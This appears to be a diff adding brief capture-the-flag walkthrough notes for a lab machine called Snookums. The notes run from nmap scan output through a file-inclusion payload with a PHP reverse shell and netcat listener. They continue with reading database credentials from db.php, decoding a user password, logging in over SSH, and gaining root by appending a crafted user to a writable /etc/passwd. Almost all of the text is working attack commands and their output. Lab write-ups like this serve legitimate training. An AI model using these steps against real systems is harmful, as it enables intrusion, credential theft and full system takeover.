@@ -1,0 +1,57 @@
+PORT      STATE SERVICE     VERSION
+22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:79:67:12:c7:ec:13:3a:96:bd:d3:b4:7c:f3:95:15 (RSA)
+|   256 a8:a3:a7:88:cf:37:27:b5:4d:45:13:79:db:d2:ba:cb (ECDSA)
+|_  256 f2:07:13:19:1f:29:de:19:48:7c:db:45:99:f9:cd:3e (ED25519)
+80/tcp    open  http        Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Simple PHP Photo Gallery
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+111/tcp   open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
+445/tcp   open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
+3306/tcp  open  mysql       MySQL (unauthorized)
+33060/tcp open  mysqlx      MySQL X protocol listener
+Service Info: Host: SNOOKUMS; OS: Unix
+
+https://www.exploit-db.com/exploits/48424
+site.com/image.php?img= [ PAYLOAD ]
+Ivan Sincek php reverse shell
+$ rlwrap nc -nlvp 111
+id
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+
+$  cat /var/www/html/db.php
+<?php
+define('DBHOST', '127.0.0.1');
+define('DBUSER', 'root');
+define('DBPASS', 'MalapropDoffUtilize1337');
+define('DBNAME', 'SimplePHPGal');
+mysql -u -p
+
+michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
+base64 decode 2 times get michael password: HockSydneyCertify123
+
+ssh michael@192.168.204.58
+ls -la etc/passwd
+-rw-r--r--. 1 michael root 1162 Jun 22  2021 /etc/passwd
+## IT IS WRITABLE !!!
+create user hello:hello and write in.
+$ openssl passwd -1 -salt password hello
+$1$password$8XMwPUo4GjxjYL1DaouYv/
+
+$ echo 'hello:$1$password$8XMwPUo4GjxjYL1DaouYv/:0:0:hello:/root:/bin/bash' >> /etc/passwd
+[michael@snookums /]$ su hello
+Password: 
+[root@snookums /]# id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+
